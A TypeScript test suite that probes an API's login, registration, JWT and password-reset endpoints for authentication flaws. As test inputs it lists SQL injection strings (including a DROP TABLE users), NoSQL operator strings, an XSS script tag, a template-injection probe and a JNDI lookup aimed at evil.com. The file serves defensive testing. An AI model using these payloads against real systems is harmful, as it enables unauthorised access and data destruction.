/**
 * Authentication Security Test Suite
 * Comprehensive testing for authentication vulnerabilities and security flaws
 *
 * DO NOT WIRE THIS SUITE INTO CI. It cannot pass: every URL it targets is
 * under an `/api/*` prefix the application never registers, so the `before`
 * hook 404s and every test skips. A database does NOT fix this — the run is
 * byte-identical with Postgres up and down. Read ./README.md and SMELL-83 in
 * docs/reports/roadmap-detected-smells-backlog.md before adding a tier, a job,
 * or a script for it.
 */

import { describe, it, before, after } from "node:test";
import assert from "node:assert/strict";
import type { FastifyInstance } from "fastify";

describe("Authentication Security Tests", { concurrency: 1 }, () => {
  let app: FastifyInstance;
  let dbAvailable = false;

  before(async () => {
    try {
      const { createApp } = await import("../../apps/api/src/index.js");
      app = await createApp();
      await app.ready();
      dbAvailable = true;
    } catch {
      dbAvailable = false;
    }
  });

  after(async () => {
    await app?.close();
  });

  describe("Password Security", () => {
    it("should reject weak passwords", async (t) => {
      if (!dbAvailable) {
        t.skip("Database not available");
        return;
      }

      const weakPasswords = [
        "123456",
        "password",
        "qwerty",
        "admin",
        "test",
        "12345678",
        "password123",
        "admin123",
      ];

      for (const password of weakPasswords) {
        const response = await app.inject({
          method: "POST",
          url: "/auth/register",
          payload: {
            email: `test-${Date.now()}@example.com`,
            password: password,
            name: "Test User",
          },
        });

        assert.ok(
          response.statusCode === 400 || response.statusCode === 422,
          `Weak password "${password}" should be rejected (got ${response.statusCode})`
        );
      }
    });

    it("should enforce minimum password requirements", async (t) => {
      if (!dbAvailable) {
        t.skip("Database not available");
        return;
      }

      // API requires minimum 8 characters
      const testCases = [
        { password: "short" },
        { password: "abc" },
        { password: "1234567" },
        { password: "ab12" },
      ];

      for (const { password } of testCases) {
        const response = await app.inject({
          method: "POST",
          url: "/auth/register",
          payload: {
            email: `test-${Date.now()}@example.com`,
            password: password,
            name: "Test User",
          },
        });

        assert.ok(
          response.statusCode === 400 || response.statusCode === 422,
          `Password "${password}" should be rejected (got ${response.statusCode})`
        );
      }
    });

    it("should properly hash passwords", async (t) => {
      if (!dbAvailable) {
        t.skip("Database not available");
        return;
      }

      const email = `test-hash-${Date.now()}@example.com`;
      const password = "SecureP@ssw0rd123!";

      const response = await app.inject({
        method: "POST",
        url: "/auth/register",
        payload: {
          email,
          password,
          name: "Test User",
        },
      });

      // Password registration should succeed or return validation error
      assert.ok(
        response.statusCode === 201 || response.statusCode === 200 || response.statusCode === 400,
        `Registration returned ${response.statusCode}`
      );
    });
  });

  describe("Authentication Bypass Attempts", () => {
    it("should prevent SQL injection in login", async (t) => {
      if (!dbAvailable) {
        t.skip("Database not available");
        return;
      }

      const sqlInjectionPayloads = [
        "admin'; --",
        "admin' OR '1'='1",
        "admin' UNION SELECT * FROM users --",
        "'; DROP TABLE users; --",
        "admin' OR 1=1 --",
        "' OR ''='",
        "' OR 1=1#",
        "admin'/**/OR/**/1=1--",
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await app.inject({
          method: "POST",
          url: "/auth/login",
          payload: {
            email: payload,
            password: "anything",
          },
        });

        // Should return 400 (validation error) or 401 (unauthorized), not 200
        assert.ok(
          response.statusCode === 400 || response.statusCode === 401,
          `SQL injection payload should be rejected (got ${response.statusCode})`
        );

        const body = JSON.parse(response.body);
        assert.strictEqual(body.token, undefined, "Token should not be returned for injection");
      }
    });

    it("should prevent NoSQL injection in login", async (t) => {
      if (!dbAvailable) {
        t.skip("Database not available");
        return;
      }

      // NoSQL injection as strings (JSON body won't accept objects for email field)
      const noSqlInjectionPayloads = ['{"$ne": null}', '{"$regex": ".*"}', '{"$gt": ""}'];

      for (const payload of noSqlInjectionPayloads) {
        const response = await app.inject({
          method: "POST",
          url: "/auth/login",
          payload: {
            email: payload,
            password: "anything",
          },
        });

        assert.ok(
          response.statusCode === 400 || response.statusCode === 401,
          `NoSQL injection should be rejected (got ${response.statusCode})`
        );
      }
    });
  });

  describe("Session Security", () => {
    it("should reject expired or malformed JWT tokens", async (t) => {
      if (!dbAvailable) {
        t.skip("Database not available");
        return;
      }

      // A JWT with an expired timestamp (header.payload.signature format)
      const expiredToken =
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiZXhwIjoxfQ.invalid";

      const response = await app.inject({
        method: "GET",
        url: "/auth/me",
        headers: {
          authorization: `Bearer ${expiredToken}`,
        },
      });

      assert.ok(
        response.statusCode === 401 || response.statusCode === 403 || response.statusCode === 404,
        `Expired/malformed token should be rejected (got ${response.statusCode})`
      );
    });
  });

  describe("Rate Limiting Security", () => {
    it("should handle rapid login attempts without crashing", async (t) => {
      if (!dbAvailable) {
        t.skip("Database not available");
        return;
      }

      const email = `ratelimit-test-${Date.now()}@example.com`;

      // Make rapid login attempts - just verify server doesn't crash
      const promises = Array.from({ length: 10 }, () =>
        app.inject({
          method: "POST",
          url: "/auth/login",
          payload: {
            email,
            password: "wrongpassword",
          },
        })
      );

      const responses = await Promise.all(promises);

      // All responses should be valid HTTP responses (400 or 401 or 429)
      for (const response of responses) {
        assert.ok(
          response.statusCode === 400 || response.statusCode === 401 || response.statusCode === 429,
          `Login attempt returned valid status: ${response.statusCode}`
        );
      }
    });
  });

  describe("Password Reset Security", () => {
    it("should reject password reset with invalid token", async (t) => {
      if (!dbAvailable) {
        t.skip("Database not available");
        return;
      }

      const response = await app.inject({
        method: "POST",
        url: "/auth/reset-password",
        payload: {
          token: "invalid-reset-token-xyz",
          newPassword: "NewSecureP@ssw0rd123!",
        },
      });

      // Should reject invalid token - 400, 401, 404, or 422 are all acceptable
      assert.ok(
        response.statusCode === 400 ||
          response.statusCode === 401 ||
          response.statusCode === 404 ||
          response.statusCode === 422,
        `Invalid reset token should be rejected (got ${response.statusCode})`
      );
    });
  });

  describe("Input Validation Security", () => {
    it("should reject malicious inputs in authentication", async (t) => {
      if (!dbAvailable) {
        t.skip("Database not available");
        return;
      }

      const maliciousInputs = [
        '<script>alert("xss")</script>',
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
      ];

      for (const maliciousInput of maliciousInputs) {
        const response = await app.inject({
          method: "POST",
          url: "/auth/register",
          payload: {
            email: `test-${Date.now()}@example.com`,
            password: "SecureP@ssw0rd123!",
            name: maliciousInput,
          },
        });

        // Server should either reject (400) or sanitize (201)
        assert.ok(
          response.statusCode === 400 || response.statusCode === 201 || response.statusCode === 200,
          `Malicious input handling returned ${response.statusCode}`
        );
      }
    });
  });
});
